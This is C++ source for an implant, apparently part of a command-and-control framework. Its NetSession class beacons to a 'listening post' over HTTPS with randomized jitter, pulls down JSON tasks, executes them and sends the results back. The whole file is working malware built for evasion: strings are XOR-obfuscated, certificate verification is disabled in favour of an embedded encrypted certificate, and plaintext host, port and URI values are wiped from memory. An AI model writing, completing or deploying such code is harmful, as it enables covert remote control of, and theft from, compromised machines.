#include "implant.h"
#include "tasks.h"
// #include "cert_embedded.h"
# include "cert_encrypted.h"

// #include <fstream>
#include <cstdio>
#include <string>
#include <string_view>
#include <iostream>
#include <chrono>
#include <algorithm>
#include <sstream>

#include <boost/uuid/uuid_io.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>

#include <cpr/cpr.h>
#include <xor_string.hpp>

#include <nlohmann/json.hpp>




#ifdef DEBUG_BUILD
#define DEBUG_LOG(x) std::cout << x << std::endl
#else
#define DEBUG_LOG(x) ((void)0)
#endif

// you can pass -DXOR_KEY=0x?? at compile time for a non-trivial key
#ifndef XOR_KEY
#define XOR_KEY 0x5A   // default – change per build
#endif


using json = nlohmann::json;


// Helper: XOR with the same key used for XOR_STR 
static std::string xorEncrypt(const std::string& input) {
    std::string out = input;
    for (char& c : out) c ^= XOR_KEY;
    return out;
}

std::string NetSession::decryptConfig(const std::string& encrypted) const {
    return xorEncrypt(encrypted);//its the same operation I just didn't know ow to keep everything organized
}



//Function to send async HTTP(S) POST with payload to listening post
[[nodiscard]] std::string sendHttpRequest(std::string_view host, 
    std::string_view port, 
    std::string_view uri, 
    std::string_view payload,
    const std::string& certPem) {

    auto const serverAddress = host;
    auto const serverPort = port;
    auto const serverUri = uri;
    auto const requestBody = json::parse(payload);

    auto secureHttps = XOR_STR_SECURE("https://"); // more secure string for critical info
    std::stringstream ss;
    ss << secureHttps.c_str() << serverAddress << ":" << serverPort << serverUri;
    std::string fullServerUrl = ss.str();

    cpr::SslOptions sslOpts = cpr::Ssl(
        cpr::ssl::VerifyHost{ false },
        cpr::ssl::VerifyPeer{ false },
        cpr::ssl::CaBuffer{ std::string(certPem) }// directly from RAM
    );

    cpr::AsyncResponse asyncRequest = cpr::PostAsync(
        cpr::Url{ fullServerUrl },
        cpr::Body{ requestBody.dump() },
        cpr::Header{ {XOR_STR("Content-Type"), XOR_STR("application/json")} },
        sslOpts  
    );

    cpr::Response response = asyncRequest.get();
    DEBUG_LOG(XOR_STR("Request body: ") << requestBody);

    volatile char* p = &fullServerUrl[0]; // wipe URL from memory
    for (size_t i = 0; i < fullServerUrl.size(); ++i) p[i] = 0;
    return response.text;
};

//enable/disable the running status
void NetSession::setRunning(bool isRunningIn) { isRunning = isRunningIn; }

//set mean dwell time
void NetSession::setMeanDwell(double meanDwell) {
    dwellDistributionSeconds = std::exponential_distribution<double>(1. / meanDwell);
}

//send task results and receive new tasks
[[nodiscard]] std::string NetSession::sendResults(const std::string& certPem) {
    boost::property_tree::ptree resultsLocal;
    //scoped lock to perform swap
    {
        std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
        resultsLocal.swap(results);
    }
    //Format result
    std::stringstream resultsStringStream;
    boost::property_tree::write_json(resultsStringStream, resultsLocal);
    std::string hostPlain = decryptConfig(hostEncrypted);
    std::string portPlain = decryptConfig(portEncrypted);
    std::string uriPlain  = decryptConfig(uriEncrypted);
    //contact listening posts with results, return received tasks
    std::string response = sendHttpRequest(hostPlain, portPlain, uriPlain,
                                           resultsStringStream.str(), certPem);
    // wipe plaintext copies
    volatile char* hp = &hostPlain[0];
    for (size_t i = 0; i < hostPlain.size(); ++i) hp[i] = 0;
    volatile char* pp = &portPlain[0];
    for (size_t i = 0; i < portPlain.size(); ++i) pp[i] = 0;
    volatile char* up = &uriPlain[0];
    for (size_t i = 0; i < uriPlain.size(); ++i) up[i] = 0;
    return response;
}

void NetSession::parseTasks(const std::string& response) {
    std::stringstream responseStringStream{ response };

    //read response from listening post as JSON
    boost::property_tree::ptree tasksPropTree;
    boost::property_tree::read_json(responseStringStream, tasksPropTree);

    //Range based for-loop to parse tasks and push them to task vector
    for (const auto& [taskTreeKey, taskTreeValue] : tasksPropTree) {
        //scoped lock to push tasks into vector, push task tree and setter for config task
        {
            tasks.push_back(
                parseTaskFrom(taskTreeValue, [this](const auto& configuration) {
                    setMeanDwell(configuration.meanDwell);
                    setRunning(configuration.isRunning); })
            );
        }
    }
}


//loop and go thru takss from listening post, service them
void NetSession::serviceTasks() {
    while (isRunning) {
        std::vector<Task> localTasks;
        {
            std::scoped_lock<std::mutex> taskLock{ taskMutex };
            tasks.swap(localTasks);
        }

        for (const auto& task: localTasks) {
            //call run() on each task
            const auto [id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);

            {
                std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
                results.add(boost::uuids::to_string(id) + ".contents", contents);
                results.add(boost::uuids::to_string(id) + ".success", success);
            }
        }
        
        //sleep
        std::this_thread::sleep_for(std::chrono::seconds{ 1 });
    }
}

//beaconing to listening post
void NetSession::beacon() { 
    std::string certPem;
    certPem.reserve(enc_cert_pem_len);
    for (unsigned i = 0; i < enc_cert_pem_len; ++i) {
        certPem.push_back(enc_cert_pem[i] ^ 0x55);
    }

    // Seed random generator once
    std::random_device rd;
    std::mt19937 rng(rd());
    std::uniform_real_distribution<double> jitterDist(0.7, 1.3);// +/- 30%

    while (isRunning) {
        try {
            DEBUG_LOG("Implant sending results to listening post...");
            const auto serverResponse = sendResults(certPem);   // pass the buffer
            DEBUG_LOG("Listening post response content: " << serverResponse);
            DEBUG_LOG("Parsing tasks received...");
            parseTasks(serverResponse);
        }
        catch (const std::exception& e) {
            DEBUG_LOG("Error occurred while beaconing: " << e.what());
        }

        // Base dwell from exponential distribution
        double baseDwell = dwellDistributionSeconds(device);
        // Apply jitter 
        double jitteredDwell = baseDwell * jitterDist(rng);
        // Convert to chrono seconds 
        auto sleepDuration = std::chrono::seconds{
            static_cast<unsigned long long>(std::max(1.0, jitteredDwell))
        };
        
        std::this_thread::sleep_for(sleepDuration);
    }
}

//Initialize variables for object
NetSession::NetSession(std::string host, std::string port, std::string uri) :
    hostEncrypted{ xorEncrypt(host) },   // you need a simple XOR encrypt function
    portEncrypted{ xorEncrypt(port) },
    uriEncrypted{ xorEncrypt(uri) },
    isRunning{ true },
    dwellDistributionSeconds{ 250 }
{
}


void NetSession::start() {
    taskThread = std::async(std::launch::async, [this] {
        serviceTasks();
    });
}